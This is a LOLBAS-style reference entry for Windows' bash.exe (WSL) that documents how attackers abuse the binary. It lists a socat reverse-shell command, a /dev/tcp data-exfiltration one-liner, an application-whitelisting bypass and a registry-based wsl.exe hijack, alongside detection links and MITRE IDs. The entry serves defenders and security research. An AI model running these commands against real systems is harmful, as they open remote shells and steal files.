---
Acknowledgement:
- Handle: '@aionescu'
  Person: Alex Ionescu
- Handle: '@d1r4c'
  Person: Asif Matadar
- Person: Liran Ravich, Cardinal
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: bash.exe -c "{CMD}"
  Description: Executes executable from bash.exe
  MitreID: T1202
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Performs execution of specified file, can be used as a defensive evasion.
- Category: Execute
  Command: bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
  Description: Executes a reverse shell
  MitreID: T1202
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Performs execution of specified file, can be used as a defensive evasion.
- Category: Execute
  Command: bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'
  Description: Exfiltrate data
  MitreID: T1202
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Performs execution of specified file, can be used as a defensive evasion.
- Category: AWL Bypass
  Command: bash.exe -c "{CMD}"
  Description: Executes executable from bash.exe
  MitreID: T1202
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Performs execution of specified file, can be used to bypass Application
    Whitelisting.
- Category: Execute
  Command: bash.exe
  Description: When executed, `bash.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`,
    which contains a folder path (`c:\program files\wsl` by default). If the value
    points to another folder containing a file named `wsl.exe`, it will be executed
    instead of the legitimate `wsl.exe` in the program files folder.
  MitreID: T1218
  OperatingSystem: Windows 10, Windows Server 2019, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Execute a payload as a child process of `bash.exe` while masquerading as
    WSL.
Created: 2018-05-25
Description: File used by Windows subsystem for Linux
Detection:
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml
- IOC: Child process from bash.exe
Full_Path:
- Path: C:\Windows\System32\bash.exe
- Path: C:\Windows\SysWOW64\bash.exe
Name: Bash.exe
Resources:
- Link: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- Link: https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/
mitre_data:
  technique_ids:
  - T1202
  - T1218
tags:
- lolbas/osbinaries
---

# Bash.exe

File used by Windows subsystem for Linux

# Path(s)

- `C:\Windows\System32\bash.exe`
- `C:\Windows\SysWOW64\bash.exe`

# AWL Bypass Commands

Executes executable from bash.exe

```batch
bash.exe -c "{CMD}"
```

- **Usecase:** Performs execution of specified file, can be used to bypass Application Whitelisting.
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows 10



# Execute Commands

Executes executable from bash.exe

```batch
bash.exe -c "{CMD}"
```

- **Usecase:** Performs execution of specified file, can be used as a defensive evasion.
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows 10



Executes a reverse shell

```batch
bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
```

- **Usecase:** Performs execution of specified file, can be used as a defensive evasion.
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows 10



Exfiltrate data

```batch
bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'
```

- **Usecase:** Performs execution of specified file, can be used as a defensive evasion.
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows 10



When executed, `bash.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`, which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.

```batch
bash.exe
```

- **Usecase:** Execute a payload as a child process of `bash.exe` while masquerading as WSL.
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 10, Windows Server 2019, Windows 11



# Resource(s)

- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Alex Ionescu (@aionescu)
- Asif Matadar (@d1r4c)
- Liran Ravich, Cardinal